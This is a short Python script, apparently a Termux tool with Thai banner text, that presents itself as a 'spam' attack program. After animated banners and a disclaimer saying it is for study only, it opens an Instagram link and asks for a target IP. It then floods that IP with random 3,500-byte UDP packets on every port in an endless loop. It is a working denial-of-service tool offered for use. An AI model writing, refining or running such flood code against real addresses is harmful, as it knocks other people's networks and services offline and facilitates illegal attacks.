#เฟสบุ๊คYT Sloth
import socket
import os
import random
import time
from pystyle import Colors, Colorate
import subprocess

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_red,"👑SHIDO START👑"))
time.sleep(3.5)
os.system("clear")
print(Colorate.Horizontal(Colors.white_to_blue,"โครงการนี้สร้างขึ้นโดยชิโด้ 👾☮️ "))
time.sleep(3.0)

print(Colorate.Horizontal(Colors.blue_to_white,"สร้างขึ้นเพื่อศึกษาเท่านั้น!! "))
time.sleep(3.0)

print(Colorate.Horizontal(Colors.white_to_blue,"👿ใช้สำหรับยิงเน็ต👿 "))
time.sleep(3.0)

print(Colorate.Horizontal(Colors.blue_to_white,"FB : YT Sloth  "))
time.sleep(3.0)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_green,"▁  "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.green_to_blue,"▁ ▂ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_green,"▁ ▂ ▃ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.green_to_blue,"▁ ▂ ▃ ▄"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_green,"▁ ▂ ▃ ▄ ▅"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.green_to_blue,"▁ ▂ ▃ ▄ ▅ ▆"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_green,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
time.sleep(1)
os.system("clear")
subprocess.run(["termux-open-url", "https://www.instagram.com/enoomzaza1"])
print(Colorate.Horizontal(Colors.blue_to_green,"╔----------------⋐🅂🄷🄸🄳🄾⋑-----------------╗"))
print(Colorate.Horizontal(Colors.blue_to_green,"""
        ╔═════════════════════════╗
                 𝙎𝙥𝙖𝙢 𝙎𝙃𝙄𝘿𝙊        
"""))
print(Colorate.Horizontal(Colors.blue_to_green,"        ╚═════════════════════════╝"))
print(Colorate.Horizontal(Colors.blue_to_green,"╚------------⋐𝐵𝑌 🆂︎🅷︎🅸︎🅳︎🅾︎#2549⋑------------╝"))
print()

ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
